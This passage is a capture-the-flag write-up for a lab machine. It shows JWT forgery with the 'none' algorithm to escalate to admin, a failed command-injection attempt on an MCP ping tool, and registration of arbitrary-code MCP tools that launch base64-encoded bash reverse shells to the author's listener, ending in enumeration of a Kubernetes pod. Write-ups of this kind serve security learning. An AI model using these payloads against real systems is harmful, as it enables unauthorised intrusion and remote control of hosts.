64 bytes de 10.129.89.142: icmp_seq=3 ttl=63 tempo=148 ms
64 bytes de 10.129.89.142: icmp_seq=4 ttl=63 tempo=148 ms

--- 10.129.89.142 estatísticas de ping ---
4 pacotes transmitidos, 4 recebidos, 0% packet loss, time 3001ms
rtt min/avg/max/mdev = 147.587/147.985/148.680/0.440 ms
[3,165s][~/Hacking/CTFs/Fireflow] ᛋᛋ nc -vz -w 5 10.129.89.142 30080
nc: connect to 10.129.89.142 port 30080 (tcp) timed out: Operation now in progress
[5,026s][1][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

The port is probably binded to `127.0.0.1` or firewalled to deny external connections. I already have ssh access to the `nightfall` user, so I just need to forward the `30080` port through ssh:

```
[10ms][~/Hacking/CTFs/Fireflow] ᛋᛋ ssh -N -L 51337:127.0.0.1:30080 nightfall@fireflow.htb
nightfall@fireflow.htb's password: 
^Z
[1]  + 23087 suspended  ssh -N -L 51337:127.0.0.1:30080 nightfall@fireflow.htb
[6,003s][148][~/Hacking/CTFs/Fireflow] ᛋᛋ bg
[1]  + 23087 continued  ssh -N -L 51337:127.0.0.1:30080 nightfall@fireflow.htb
[12ms][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

Now I can connect to the swagger using my own browser:

![[Fireflow - MCP AI Tool Registry Swagger.png]]

I could have opened openapi.json as well, but a clean UI in my browser is much friendly and easier to use, but if you want it, you just need to run this curl (and don't even need to do port forwarding):

```
nightfall@fireflow:~$ curl http://10.129.89.142:30080/openapi.json -s | jq
{
  "openapi": "3.1.0",
  "info": {
    "title": "MCP AI Tool Registry — Task Force Nightfall",
    "version": "0.1.0"
  },
  --- MORE DATA ---
}
nightfall@fireflow:~$ 
```

## Authenticating in service

The schema for the endpoint `POST /api/v1/auth` is:

```json
{
  "username": "string",
  "password": "string"
}
```

So I just needed to curl with `-X` set to `POST` and pass the leaked credentials with `--d`:

```
nightfall@fireflow:~$ curl -X 'POST'   'http://10.129.89.142:30080/api/v1/auth'   -H 'accept: application/json'   -H 'Content-Type: application/json'   -d '{
  "username": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}' -s | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
nightfall@fireflow:~$ 
```

## JWT Compromise

After decoding the given Json Web Token (aka jwt), I discovered it's content:

```json
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "sub": "langflow-bot",
  "role": "user"
}
```

I obviously just edited this (in [jwt.io](https://www.jwt.io/)) to use the `none` algorithm and escalate my privileges to `"role": "admin"`. After this I devilered this request to see if nothing breaks:

```
nightfall@fireflow:~$ curl http://10.129.89.142:30080/api/v1/tools -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' -s | jq
[
  {
    "name": "ping_host",
    "description": "Ping a target host 3 times and return ICMP output."
  },
  {
    "name": "get_metrics_summary",
    "description": "Return a summary of system memory and load average from /proc."
  },
  {
    "name": "list_running_tasks",
    "description": "List the top 20 running processes sorted by CPU usage."
  }
]
nightfall@fireflow:~$
```

Everything seens good, but as the swagger docs let me know, this endpoint don't require authentication.

## Shell through the Ping Tool

Before creating a custom tool, I decided to test the `ping_host` protocol, because if the `host` was directly concatenated into a `bash -c 'ping -c4 $host'`, I would be able to send a `host` like `127.0.0.1;id` to run commands directly into bash.

To exploit this possibility, I asked for my partner (aka claude) to create a python that interacts with MCP through CLI, and he gave me this:

```python
# /// script
# dependencies = [
#     "httpx",
# ]
# ///

import httpx
import json
import argparse
import sys

# --- HARDCODED CONFIG ---
TOKEN_BEARER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ."

def run_mcp_flow(url, method_mcp, params_mcp):
    """Manages the MCP lifecycle and executes the requested command."""
    base_headers = {
        "Authorization": f"Bearer {TOKEN_BEARER}",
        "Content-Type": "application/json"
    }

    with httpx.Client(headers=base_headers) as client:
        # 1. Required step: Initialization handshake
        init_payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2026-07-28",
                "capabilities": {},
                "clientInfo": {"name": "mcp-argparse-cli", "version": "1.0.0"}
            }
        }

        try:
            response = client.post(url, json=init_payload, timeout=10.0)
        except Exception as e:
            print(f"❌ Connection error with server: {e}", file=sys.stderr)
            sys.exit(1)

        if response.status_code != 200:
            print(f"❌ Initial handshake failed (Status {response.status_code}):", file=sys.stderr)
            print(response.text, file=sys.stderr)
            sys.exit(1)

        response_data = response.json()

        # Capture the required session ID
        session_id = response.headers.get("Mcp-Session-Id")
        if not session_id and "params" in response_data:
            session_id = response_data["params"].get("sessionId")

        request_headers = base_headers.copy()
        if session_id:
            request_headers["Mcp-Session-Id"] = session_id

        # 2. Required step: Initialization confirmation
        conf_payload = {
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        }
        client.post(url, json=conf_payload, headers=request_headers)

        # 3. Execute the user's action
        final_payload = {
            "jsonrpc": "2.0",
            "id": 2,
            "method": method_mcp,
            "params": params_mcp
        }

        action_res = client.post(url, json=final_payload, headers=request_headers)
        return action_res.json()

def main():
    parser = argparse.ArgumentParser(description="Standalone CLI client for authenticated MCP endpoints.")
    parser.add_argument("--url", default="http://localhost:51337/mcp", help="MCP endpoint URL (Default: http://localhost:51337/mcp)")

    subparsers = parser.add_subparsers(dest="subcommand", required=True, help="Available subcommands")

    # Subcommand: list
    subparsers.add_parser("list", help="Lists all tools available at the endpoint")

    # Subcommand: call
    parser_call = subparsers.add_parser("call", help="Executes a specific tool")
    parser_call.add_argument("name", help="Name of the tool to execute")
    parser_call.add_argument("--args", default="{}", help="Tool arguments as a JSON string (Ex: '{\"param\": \"value\"}')")

    args = parser.parse_args()

    if args.subcommand == "list":
        print(f"🔍 Fetching tools at: {args.url}...")
        result = run_mcp_flow(args.url, "tools/list", {})
        print(json.dumps(result, indent=2, ensure_ascii=False))

    elif args.subcommand == "call":
        try:
            args_json = json.loads(args.args)
        except json.JSONDecodeError:
            print("❌ Error: The value passed to `--args` is not valid JSON.", file=sys.stderr)
            print("Correct example: --args '{\"city\": \"São Paulo\"}'", file=sys.stderr)
            sys.exit(1)

        print(f"🚀 Running tool '{args.name}' at: {args.url}...")
        params_payload = {
            "name": args.name,
            "arguments": args_json
        }
        result = run_mcp_flow(args.url, "tools/call", params_payload)
        print(json.dumps(result, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

This can be executed using [`uv`](https://docs.astral.sh/uv/) (because I'm on arch, and can't just install a pip package, and honestly I hate managing virtual environments for python everytime that I need to run something).

```
[12ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py --help                                            
usage: mcp-cli.py [-h] [--url URL] {list,call} ...

Standalone CLI client for authenticated MCP endpoints.

positional arguments:
  {list,call}  Available subcommands
    list       Lists all tools available at the endpoint
    call       Executes a specific tool

options:
  -h, --help   show this help message and exit
  --url URL    MCP endpoint URL (Default: http://localhost:51337/mcp)
[220ms][~/Hacking/Tools] ᛋᛋ 
```

Firstly I enumerated the available tools, because the `GET /api/v1/tools` didn't gave me the parameters:

```json
[220ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py list  
🔍 Fetching tools at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "tools": [
      {
        "name": "ping_host",
        "description": "Ping a target host 3 times and return ICMP output.",
        "inputSchema": {
          "type": "object",
          "properties": {
            "target": {
              "type": "string",
              "description": "IP address or hostname to ping"
            }
          },
          "required": [
            "target"
          ]
        }
      },
      {
        "name": "get_metrics_summary",
        "description": "Return a summary of system memory and load average from /proc.",
        "inputSchema": {
          "type": "object",
          "properties": {}
        }
      },
      {
        "name": "list_running_tasks",
        "description": "List the top 20 running processes sorted by CPU usage.",
        "inputSchema": {
          "type": "object",
          "properties": {}
        }
      }
    ]
  }
}
[828ms][~/Hacking/Tools] ᛋᛋ 
```

With this, I can build a malicious request to the `ping_host` tool:

```json
[10ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py call ping_host --args '{"target": "127.0.0.1;id"}'
🚀 Running tool 'ping_host' at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "\n\nping: 127.0.0.1;id: Name or service not known\n\n"
      }
    ],
    "isError": false
  }
}
[0,892s][~/Hacking/Tools] ᛋᛋ 
```

Unfortunately, this didn't work, the tool is probably using `execv` directly to `/usr/bin/ping` with accurate concatenation.

## Exploiting Tool Creation for Shell Access

To build the tool creation payload, I used the swagger UI (under `GET /docs`) to create this curl command:

```
curl -X 'POST' \
  'http://localhost:30080/api/v1/tools' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "shell",
  "description": "Executes shell commands on the host system and returns the combined stdout and stderr output.",
  "inputSchema": {
    "type": "object",
    "properties": {
      "cmd": {
        "type": "string",
        "description": "The exact shell command to execute."
      }
    },
    "required": ["cmd"]
  },
  "code": "import subprocess as s\n\ndef shell(cmd: str) -> str:\n    r = s.run(['\''/bin/bash'\'', '\''-c'\'', cmd], stdout=s.PIPE, stderr=s.STDOUT, text=True)\n    return r.stdout"
}'
```

I just ran it:

```
nightfall@fireflow:~$ curl -X 'POST' \
  'http://localhost:30080/api/v1/tools' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "shell",
  "description": "Executes shell commands on the host system and returns the combined stdout and stderr output.",
  "inputSchema": {
    "type": "object",
    "properties": {
      "cmd": {
        "type": "string",
        "description": "The exact shell command to execute."
      }
    },
    "required": ["cmd"]
  },
  "code": "import subprocess as s\n\ndef shell(cmd: str) -> str:\n    r = s.run(['\''/bin/bash'\'', '\''-c'\'', cmd], stdout=s.PIPE, stderr=s.STDOUT, text=True)\n    return r.stdout"
}'
{"status":"registered","name":"shell"}nightfall@fireflow:~$ 
```

Now I just list again with my cli:

```
[4ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py list                                              
🔍 Fetching tools at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "tools": [
      <-- OTHER TOOLS -->
      {
        "name": "shell",
        "description": "Executes shell commands on the host system and returns the combined stdout and stderr output.",
        "inputSchema": {
          "type": "object",
          "properties": {
            "cmd": {
              "type": "string",
              "description": "The exact shell command to execute."
            }
          },
          "required": [
            "cmd"
          ]
        }
      }
    ]
  }
}
[0,922s][~/Hacking/Tools] ᛋᛋ 
```

Now I run it:

```
[0,844s][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py call shell --args '{"cmd": "ls"}'
🚀 Running tool 'shell' at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": ""
      }
    ],
    "isError": false
  }
}
[0,893s][~/Hacking/Tools] ᛋᛋ 
```

Ops, it seems like nothing happened, I don't know if the mcp just don't returns the output or if it just didn't ran. To check it, I just tried (firstly) sending a reverse shell:

```
[788ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py call shell --args '{"cmd": "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTYwLzQ0NDQgMD4mMSkgJg==|base64 -d|bash"}'
🚀 Running tool 'shell' at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": ""
      }
    ],
    "isError": false
  }
}
[0,852s][~/Hacking/Tools] ᛋᛋ 
```

Nothing happened, I'll create a raw tool with just properties, just a connection to my PC. First I need to check for `nc` in the host:

```
nightfall@fireflow:~$ which nc
/usr/bin/nc
nightfall@fireflow:~$ 
```

Alright, now I just send this:

```json
{
  "name": "ping_me",
  "description": "Ping my device",
  "properties": {},
  "code": "import subprocess as s;s.run(['/usr/bin/nc', '-vz', '-w', '5', '10.10.15.160', '4445'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
}
```

If this successfully connect to my machine, I'll know that I can just send a reverse shell to me. Now I run the curl registry (through swagger, it's easier) and:

```json
{ "status": "registered", "name": "ping_me" }
```

Just to check it, let me list tools using the `.py` cli:

```
[1,110s][~/Hacking/CTFs/Fireflow] ᛋᛋ uv run /tmp/mcp-cli.py list | grep "ping_me" -C 6
        "inputSchema": {
          "type": "object",
          "properties": {}
        }
      },
      {
        "name": "ping_me",
        "description": "Ping my device",
        "inputSchema": {
          "type": "object",
          "properties": {}
        }
      }
[0,859s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

And then run the `nc` listener, to check the connection on my side:

```
[0,859s][~/Hacking/CTFs/Fireflow] ᛋᛋ uv run /tmp/mcp-cli.py call ping_me              
🚀 Running tool 'ping_me' at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "\nTraceback (most recent call last):\n  File \"<string>\", line 1, in <module>\n  File \"/usr/local/lib/python3.11/subprocess.py\", line 548, in run\n    with Popen(*popenargs, **kwargs) as process:\n         ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.11/subprocess.py\", line 1026, in __init__\n    self._execute_child(args, executable, preexec_fn, close_fds,\n  File \"/usr/local/lib/python3.11/subprocess.py\", line 1955, in _execute_child\n    raise child_exception_type(errno_num, err_msg, err_filename)\nFileNotFoundError: [Errno 2] No such file or directory: '/usr/bin/nc'\n"
      }
    ],
    "isError": true
  }
}
```

I just get an error that says that the netcat isn't installed, but I checked it, so this web-server is probably running inside a container. To check it, I could run the `lft` (which stands for "Layer Four Traceroute"), who gives me how many hops do I need to reach the `host:port`. If this port is being exposed by a container, I need one more hop to reach it.

Unfortunately, the port is binded to `127.0.0.1`, which means that I can't reach it and `lft` just gives me this through port forwarding:

```
[10ms][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo lft 127.0.0.1:51337
Tracing ...T
TTL LFT trace to localhost (127.0.0.1):51337/tcp
 1  [target open] localhost (127.0.0.1):51337 0.1ms
 2  [target open] localhost (127.0.0.1):51337 0.1ms
```

I decided that I should skip the ping process and directly try sending a reverse shell, so I just opened a listener in penelope to port `4445` and the created the new tool:

```
(Penelope)─(Session [1])> listeners add -i tun0 -p 4445
[+] Listening for reverse shells on 10.10.15.160:4445 
(Penelope)─(Session [1])> 
```

```
{
  "name": "rev_me",
  "description": "Reverse shell to 10.10.15.160:4445",
  "properties": {},
  "code": "import subprocess as s;s.run(['/bin/sh', '-c', 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTYwLzQ0NDUgMD4mMSkgJg==|base64 -d|bash'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
}
```

So let's run it:

```
[0,864s][~/Hacking/CTFs/Fireflow] ᛋᛋ uv run /tmp/mcp-cli.py call rev_me 
🚀 Running tool 'rev_me' at: http://localhost:51337/mcp...
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": ""
      }
    ],
    "isError": false
  }
}
[1,898s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

and (🥁🥁🥁):

```
[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.244.214 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
(Penelope)─(Session [1])> 
```

# Enumeration

As I didn't confirmed the container and provider, I'll check the environment variables for anything, and then grep `/proc/self/cgroups` for any interesting strings:

```
mcp@mcp-server-54464cb475-29ztf:~$ env
SHELL=/usr/bin/bash
KUBERNETES_SERVICE_PORT_HTTPS=443
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
KUBERNETES_SERVICE_PORT=443
HISTCONTROL=ignoreboth
HOSTNAME=mcp-server-54464cb475-29ztf
PYTHON_VERSION=3.11.15
PWD=/home/mcp
MCP_SERVER_SERVICE_HOST=10.43.250.195
MCP_SERVER_SERVICE_PORT=8080
HOME=/home/mcp
MCP_SERVER_PORT_8080_TCP_PROTO=tcp
LANG=C.UTF-8
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
HISTFILE=/dev/null
LS_COLORS=<Another enormous and useless env>
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
MCP_SERVER_PORT_8080_TCP_PORT=8080
MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
TERM=xterm-256color
SHLVL=2
MCP_SERVER_PORT=tcp://10.43.250.195:8080
KUBERNETES_PORT_443_TCP_PROTO=tcp
MCP_SERVER_SERVICE_PORT_HTTP=8080
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/app
mcp@mcp-server-54464cb475-29ztf:~$ 
```

And here we go. I can strictly determine: we are inside a kubernetes pod.

---